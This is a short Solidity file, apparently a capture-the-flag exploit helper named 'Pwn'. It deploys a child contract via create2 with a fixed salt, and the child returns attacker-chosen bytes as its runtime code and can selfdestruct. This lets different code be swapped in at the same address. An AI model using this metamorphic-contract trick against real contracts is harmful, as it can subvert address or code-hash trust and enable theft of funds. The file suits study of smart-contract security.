// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Pwn {
    bytes public payload;
    constructor() {
    }
    
    function set(bytes calldata p) external {
        payload = p;
    }

    function deploy() external returns (address) {
        address res;
        bytes memory code = type(Child).creationCode;
        uint256 len = code.length;
        bytes memory salt = hex"1337";
        assembly {
            res := create2(0, add(code, 0x20), len, add(salt, 0x20))
        }
        return res;
    }
}

contract Child {
    constructor() {
        Pwn pwn = Pwn(msg.sender);
        bytes memory res = pwn.payload();
        assembly {
            return(add(res, 0x20), 32)
        }
    }
    
    function die() external {
        selfdestruct(payable(msg.sender));
    }
}
